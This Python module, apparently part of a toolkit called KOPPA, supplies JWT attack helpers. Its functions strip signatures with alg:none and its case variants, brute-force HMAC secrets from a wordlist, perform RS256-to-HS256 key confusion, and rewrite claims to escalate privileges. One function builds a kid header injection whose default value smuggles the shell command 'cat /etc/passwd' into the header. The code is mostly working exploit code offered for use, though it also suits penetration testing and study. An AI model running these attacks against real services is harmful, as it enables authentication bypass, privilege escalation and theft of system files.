"""KOPPA stdlib: jwt — JWT decode, forge, crack, and attack helpers."""
import base64, json, hmac, hashlib, time, re


def _b64u_dec(s):
    return base64.urlsafe_b64decode(s + "==")

def _b64u_enc(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def _parts(token):
    p = token.strip().split(".")
    if len(p) != 3:
        return None, None, None
    return p

def decode(token):
    """Decode and return JWT payload dict (no verification)."""
    h, p, s = _parts(token)
    if not p:
        return {}
    try:
        return json.loads(_b64u_dec(p).decode())
    except Exception:
        return {}

def header(token):
    h, p, s = _parts(token)
    if not h:
        return {}
    try:
        return json.loads(_b64u_dec(h).decode())
    except Exception:
        return {}

def is_expired(token):
    payload = decode(token)
    exp = payload.get("exp")
    if not exp:
        return False
    return time.time() > exp

def none_alg(token):
    """alg:none attack — strips signature and sets alg to none."""
    h, p, _ = _parts(token)
    if not h:
        return token
    try:
        head_dict         = json.loads(_b64u_dec(h).decode())
        head_dict["alg"]  = "none"
        new_h             = _b64u_enc(json.dumps(head_dict, separators=(",", ":")))
        return f"{new_h}.{p}."
    except Exception:
        return token

def none_alg_variants(token):
    """Return all known alg:none case variants."""
    h, p, _ = _parts(token)
    results = []
    for alg in ["none", "None", "NONE", "nOnE"]:
        try:
            head_dict        = json.loads(_b64u_dec(h).decode())
            head_dict["alg"] = alg
            new_h = _b64u_enc(json.dumps(head_dict, separators=(",", ":")))
            results.append(f"{new_h}.{p}.")
        except Exception:
            pass
    return results

def forge(payload, secret, alg="HS256"):
    """Forge a signed JWT with given payload and secret."""
    if isinstance(payload, str):
        payload = json.loads(payload)
    head_b64    = _b64u_enc(json.dumps({"alg": alg, "typ": "JWT"}, separators=(",", ":")))
    payload_b64 = _b64u_enc(json.dumps(payload, separators=(",", ":")))
    msg         = f"{head_b64}.{payload_b64}".encode()

    if alg in ("HS256", "HS384", "HS512"):
        hash_map = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
        sig = _b64u_enc(hmac.new(secret.encode(), msg, hash_map[alg]).digest())
    elif alg == "none":
        sig = ""
    else:
        sig = ""
    return f"{head_b64}.{payload_b64}.{sig}"

def crack(token, wordlist):
    """Brute-force HMAC secret from a wordlist. Returns secret or None."""
    h, p, sig = _parts(token)
    if not sig:
        return None
    head = json.loads(_b64u_dec(h).decode())
    alg  = head.get("alg", "HS256")
    hash_map = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
    hfn  = hash_map.get(alg, hashlib.sha256)
    msg  = f"{h}.{p}".encode()
    for word in wordlist:
        candidate = _b64u_enc(hmac.new(word.encode(), msg, hfn).digest())
        if candidate == sig:
            return word
    return None

def kid_injection(token, cmd='cat /etc/passwd'):
    """Generate kid header injection payload."""
    h, p, _ = _parts(token)
    try:
        head_dict = json.loads(_b64u_dec(h).decode())
        head_dict["kid"] = f"/dev/null; {cmd}; echo "
        new_h = _b64u_enc(json.dumps(head_dict, separators=(",", ":")))
        return f"{new_h}.{p}."
    except Exception:
        return token

def jwks_confusion(token, public_key_pem):
    """RS256→HS256 key confusion attack."""
    h, p, _ = _parts(token)
    try:
        head_dict       = json.loads(_b64u_dec(h).decode())
        head_dict["alg"] = "HS256"
        new_h = _b64u_enc(json.dumps(head_dict, separators=(",", ":")))
        msg   = f"{new_h}.{p}".encode()
        sig   = _b64u_enc(hmac.new(public_key_pem.encode(), msg, hashlib.sha256).digest())
        return f"{new_h}.{p}.{sig}"
    except Exception:
        return token

def escalate(token, claims, secret=None):
    """Modify claims in a JWT (with re-signing if secret known)."""
    payload = decode(token)
    payload.update(claims)
    if secret:
        head = header(token)
        return forge(payload, secret, head.get("alg", "HS256"))
    h, _, sig = _parts(token)
    payload_b64 = _b64u_enc(json.dumps(payload, separators=(",", ":")))
    return f"{h}.{payload_b64}.{sig}"

def analyze(token):
    """Full JWT analysis report."""
    h, p, sig = _parts(token)
    head_dict    = header(token)
    payload_dict = decode(token)
    lines = [
        "JWT Analysis",
        f"  Algorithm : {head_dict.get('alg', 'unknown')}",
        f"  Key ID    : {head_dict.get('kid', 'none')}",
        f"  Has sig   : {bool(sig)}",
        f"  Expired   : {is_expired(token)}",
        f"  Payload   : {payload_dict}",
    ]
    if head_dict.get("alg") == "none":
        lines.append("  [!] alg:none — NO signature verification!")
    if not sig:
        lines.append("  [!] Missing signature — forged token?")
    return "\n".join(lines)
